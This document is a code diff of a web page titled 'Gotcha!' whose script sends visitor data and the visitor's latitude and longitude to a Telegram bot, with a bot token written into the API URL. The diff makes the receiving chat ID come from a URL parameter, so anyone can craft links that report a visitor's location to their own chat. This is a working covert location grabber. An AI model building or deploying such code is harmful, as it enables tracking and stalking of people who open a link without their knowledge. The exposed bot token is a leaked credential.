@@ -5,6 +5,9 @@
 <h2>Gotcha!</h2>
 
 <script>
+let url_string = new URL(window.location.href);
+let url = new URL(url_string);
+var param = url.searchParams.get("id");
 const sendMessageToTelegram = async (message) => {
     const apiUrl = `https://api.telegram.org/bot1618854913:AAGbM-sgQGHdcbxTzcpkisrsn2Q32n8Nqj8/sendMessage`;
 
@@ -16,7 +19,7 @@ const sendMessageToTelegram = async (message) => {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                chat_id: 424526614,
+                chat_id: param,
                 text: jsondate
             }),
         });
@@ -61,7 +64,7 @@ const sendMessageToTelegramGeo = async (position) => {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                chat_id: 424526614,
+                chat_id: param,
                 text: 'https://yandex.ru/maps/?mode=search&text='+position.coords.latitude+','+position.coords.longitude
             }),
         });
